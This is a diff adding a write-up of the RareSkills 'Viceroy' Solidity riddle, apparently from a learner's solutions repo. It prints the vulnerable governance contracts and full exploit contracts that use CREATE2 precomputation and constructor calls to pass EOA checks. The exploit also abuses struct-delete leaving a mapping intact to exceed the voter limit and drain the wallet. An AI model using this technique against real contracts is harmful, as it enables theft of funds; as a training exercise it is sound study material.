@@ -732,3 +732,243 @@ The function has the intention to remove the `user` item from the `users` array 
 However, the problem is that in Solidity, writes to storage pointers do not save new data. The line `User storage user = users[index]` creates a pointer to a location in the contract storage, so `user` is essentially a reference to `users[index]`. However, `user = users[users.length - 1]` is merely just changing the reference that `user` is pointing to, and it does not write to actual storage. So when the function subsequently calls `users.pop()`, its only just popping the last item in the `users` array, without actually popping the array item of the given `index`.
 
 So to exploit, we just have to create multiple deposits, one with 1 ether, and the other with 0 ether. And we can essentially call `withdraw` with the first deposit's index twice to successfully withdraw 1 ether more than once, and steal all the ether in the `DeleteUser` contract.
+
+## RareSkills Solidity Riddles: Viceroy
+Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Viceroy.sol
+
+### Contracts
+- `src/Week10-11/Viceroy.sol`
+```
+contract OligarchyNFT is ERC721 {
+    constructor(address attacker) ERC721("Oligarch", "OG") {
+        _mint(attacker, 1);
+    }
+
+    // function _beforeTokenTransfer(address from, address, uint256, uint256) internal virtual override {
+    //     require(from == address(0), "Cannot transfer nft"); // oligarch cannot transfer the NFT
+    // }
+}
+
+contract Governance {
+    IERC721 private immutable oligargyNFT;
+    CommunityWallet public immutable communityWallet;
+    mapping(uint256 => bool) public idUsed;
+    mapping(address => bool) public alreadyVoted;
+
+    struct Appointment {
+        //approvedVoters: mapping(address => bool),
+        uint256 appointedBy; // oligarchy ids are > 0 so we can use this as a flag
+        uint256 numAppointments;
+        mapping(address => bool) approvedVoter;
+    }
+
+    struct Proposal {
+        uint256 votes;
+        bytes data;
+    }
+
+    mapping(address => Appointment) public viceroys;
+    mapping(uint256 => Proposal) public proposals;
+
+    constructor(ERC721 _oligarchyNFT) payable {
+        oligargyNFT = _oligarchyNFT;
+        communityWallet = new CommunityWallet{value: msg.value}(address(this));
+    }
+
+    /*
+     * @dev an oligarch can appoint a viceroy if they have an NFT
+     * @param viceroy: the address who will be able to appoint voters
+     * @param id: the NFT of the oligarch
+     */
+    function appointViceroy(address viceroy, uint256 id) external {
+        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
+        require(!idUsed[id], "already appointed a viceroy");
+        require(viceroy.code.length == 0, "only EOA");
+
+        idUsed[id] = true;
+        viceroys[viceroy].appointedBy = id;
+        viceroys[viceroy].numAppointments = 5;
+    }
+
+    function deposeViceroy(address viceroy, uint256 id) external {
+        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
+        require(viceroys[viceroy].appointedBy == id, "only the appointer can depose");
+
+        idUsed[id] = false;
+        delete viceroys[viceroy];
+    }
+
+    function approveVoter(address voter) external {
+        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
+        require(voter != msg.sender, "cannot add yourself");
+        require(!viceroys[msg.sender].approvedVoter[voter], "cannot add same voter twice");
+        require(viceroys[msg.sender].numAppointments > 0, "no more appointments");
+        require(voter.code.length == 0, "only EOA");
+
+        viceroys[msg.sender].numAppointments -= 1;
+        viceroys[msg.sender].approvedVoter[voter] = true;
+    }
+
+    function disapproveVoter(address voter) external {
+        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
+        require(viceroys[msg.sender].approvedVoter[voter], "cannot disapprove an unapproved address");
+        viceroys[msg.sender].numAppointments += 1;
+        delete viceroys[msg.sender].approvedVoter[voter];
+    }
+
+    function createProposal(address viceroy, bytes calldata proposal) external {
+        require(
+            viceroys[msg.sender].appointedBy != 0 || viceroys[viceroy].approvedVoter[msg.sender],
+            "sender not a viceroy or voter"
+        );
+
+        uint256 proposalId = uint256(keccak256(proposal));
+        proposals[proposalId].data = proposal;
+    }
+
+    function voteOnProposal(uint256 proposal, bool inFavor, address viceroy) external {
+        require(proposals[proposal].data.length != 0, "proposal not found");
+        require(viceroys[viceroy].approvedVoter[msg.sender], "Not an approved voter");
+        require(!alreadyVoted[msg.sender], "Already voted");
+        if (inFavor) {
+            proposals[proposal].votes += 1;
+        }
+        alreadyVoted[msg.sender] = true;
+    }
+
+    function executeProposal(uint256 proposal) external {
+        require(proposals[proposal].votes >= 10, "Not enough votes");
+        (bool res,) = address(communityWallet).call(proposals[proposal].data);
+        require(res, "call failed");
+    }
+}
+
+contract CommunityWallet {
+    address public governance;
+
+    constructor(address _governance) payable {
+        governance = _governance;
+    }
+
+    function exec(address target, bytes calldata data, uint256 value) external {
+        require(msg.sender == governance, "Caller is not governance contract");
+        (bool res,) = target.call{value: value}(data);
+        require(res, "call failed");
+    }
+
+    fallback() external payable {}
+}
+
+contract ExploitMain {
+    using Create2Sample for address;
+
+    function exploit(Governance governance, address attackerWallet) public {
+        //Precompute viceroy address
+        bytes memory viceroyByteCode = getViceroyByteCode(address(governance), attackerWallet);
+        address viceroyPrecomputeAddress = address(this).precomputeAddress(bytes32(uint256(99)), viceroyByteCode);
+
+        //Appoint viceroy with precomputed address
+        //Precomputed address will not have any code so it will be considered EOA
+        governance.appointViceroy(viceroyPrecomputeAddress, 1);
+
+        //Deploy ExploitViceroyEOA with precomputed address
+        new ExploitViceroyEOA{salt: bytes32(uint256(99))}(address(governance), attackerWallet);
+    }
+
+    function getViceroyByteCode(
+        address _governanceAddress,
+        address attackerWallet
+    )
+        public
+        pure
+        returns (bytes memory)
+    {
+        bytes memory creationCode = type(ExploitViceroyEOA).creationCode;
+        return abi.encodePacked(creationCode, abi.encode(_governanceAddress, attackerWallet));
+    }
+}
+
+contract ExploitViceroyEOA {
+    using Create2Sample for address;
+
+    Governance public governanceContract;
+
+    //Calls to Governance must be made in constructor to bypass EOA checks
+    constructor(address _governanceAddress, address attackerWallet) {
+        //create proposal to send funds to attackerWallet
+        governanceContract = Governance(_governanceAddress);
+        bytes memory proposal = abi.encodeWithSignature("exec(address,bytes,uint256)", attackerWallet, "", 10 ether);
+        uint256 proposalId = uint256(keccak256(proposal));
+        governanceContract.createProposal(address(this), proposal);
+
+        //Batch create ExploitVoterEOA contracts to vote on proposal
+        for (uint256 i; i < 10; i++) {
+            bytes memory voterCreationCode = type(ExploitVoterEOA).creationCode;
+            bytes memory voterByteCode = abi.encodePacked(voterCreationCode, abi.encode(_governanceAddress, proposalId));
+            address voterPrecomputeAddress = address(this).precomputeAddress(bytes32(uint256(i)), voterByteCode);
+
+            //Approve voter since precomputed address will be considered EOA
+            governanceContract.approveVoter(voterPrecomputeAddress);
+
+            //Deploy ExploitVoterEOA with precomputed address
+            //Constructor will vote for the proposal
+            new ExploitVoterEOA{salt: bytes32(uint256(i))}(governanceContract, proposalId);
+
+            //Disapprove voter to exploit delete vulnerability
+            governanceContract.disapproveVoter(voterPrecomputeAddress);
+        }
+
+        //Execute proposal to send funds to attackerWallet
+        governanceContract.executeProposal(proposalId);
+    }
+}
+
+contract ExploitVoterEOA {
+    //To be deployed by ExploitViceroyEOA (msg.sender).
+    //Calls to Governance must be made in constructor to bypass EOA checks
+    constructor(Governance governance, uint256 proposalId) {
+        governance.voteOnProposal(proposalId, true, msg.sender);
+    }
+}
+
+library Create2Sample {
+    function precomputeAddress(
+        address contractDeployer,
+        bytes32 salt,
+        bytes memory contractByteCode
+    )
+        public
+        pure
+        returns (address)
+    {
+        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), contractDeployer, salt, keccak256(contractByteCode)));
+        return address(uint160(uint256(hash)));
+    }
+}
+```
+
+### Exploit
+Refer to https://solidity-by-example.org/app/create2/ and https://www.rareskills.io/post/ethereum-contract-creation-code
+
+TLDR, to precompute a contract's address: contract creationCode -> contract bytecode -> hashing step including casting last 20 bytes of hash to address type. (Refer to above links for better explanation).
+
+The rules of engaging with `Governance` are:
+- The `OligarchyNFT` cannot be transferred.
+- `appointViceroy` must be called by the owner of the NFT, the viceroy can only be an EOA.
+- `deposeViceroy`` can only be called by the oligarch who appointed the viceroy.
+- `approveVoter` can only be called by the viceroy, the voter cannot be the viceroy, and the voter must be an EOA.
+- `createProposal` can only be called by the viceroy or voter, both of which must be EOAs.
+- `voteOnProposal` can only be called by a voter, who must be an EOA.
+- Each address can only vote once, no matter which proposal its voting for.
+
+These rules imply that if we creating attacking contracts, any calls to `Governance` must be done in the constructor, so that `address.code.length == 0` since the contract does not have code size during deployment. This will by pass the EOA checks for appoiting the `viceroy` and voters in `approvedVoter`.
+
+The main vulnerability in `Governance` is how `delete` is used with the `Appointment` struct containing a mapping which is a dynamic datatype. In Solidity, deleting structs that contain dynamic datatypes does not delete the dynamic data. The delete keyword only deletes one storage slot, if the slot contains refs to other slots, those wont be deleted. So in `delete viceroys[viceroy]`, this will only reset `appointedBy` and `numAppointments` to default values, but `approvedVoter` will remain unchanged for the associated viceroy address. So when calling `disapproveVoter`, `numAppointments` gets reduced, but nothing happens to `approvedVoter`, so the viceroy can repeatedly approve-disapprove-approve voters such that the number of approved voters under the viceroy exceeds the intended limit of only 5 per viceroy.
+
+The other challenge in this exploit is really using `Create2` to precompute the attacking contracts' addresses so that we can know their addresses before deploying them, and trick `Governance` into thinking they are EOAs since their code size will be zero before they are actually deployed. There are three attacking contracts: `ExploitMain`, `ExploitVicerorEOA`, `ExploitVoterEOA`, and a library `Create2Sample` that is used to precompute the attacking contracts' addresses.
+
+In `ExploitMain`, when `exploit` is called, `ExploitViceroyEOA`'s address will be precomputed, and the function will call `Governance.appointViceroy` to set this address as the viceroy. This call will pass since the address is a precompute so there is no code at the address. Then we can deploy `ExploitViceroy` using Create2: `{salt: bytes32(uint256(99))}`, with this same salt we used to generate the `viceroyPrecomputeAddress` [Note that this syntax is the new way to invoke create2 w/o assembly].
+
+In `ExploitViceroyEOA`, we interact with `Goverance` in the constructor only so that our attack gets called on the contract's deployment in `exploit`. The proposal to send funds to `attackerWallet` is created: `abi.encodeWithSignature("exec(address,bytes,uint256)", attackerWallet, "", 10 ether);`, so that when the proposal has enough votes, `executeProposal` will execute a low-level `call` to `CommunityWallet` with the data to call `exec` and send funds to `attackerWallet`. Then in a for loop for 10 voters, we precompute each `ExploitVoterEOA`'s address and call `Governance.approveVoter` to approve each voter. This call will pass since each voter's address is only a precompute so there is no code at the address. Then we deploy each `ExploitVoterEOA` using Create2 with the same salt (`{salt: bytes32(uint256(i))}`) we used to generate `voterPrecomputeAddress`.
+
+While still in the for loop, every time one voter contract is deployed, each `ExploitVoterEOA`'s constructor will contain code to call `Governance.voteOnProposal`, and the proposal will receive 1 vote during each iteration. After the voter contract is deployed, we can simply call `Governance.disapproveVoter(voterPrecomputeAddress)` to exploit the `delete` bug, and allow `ExploitViceroyEOA` to have more than 5 approved voters. By the end of the for loop, the viceroy will have 10 approved voters, and the proposal would have received 10 votes. `ExploitViceroy` then calls `Governance.executeProposal` at the end of the contructor to execute the call to transfer funds to `attackerWallet`.
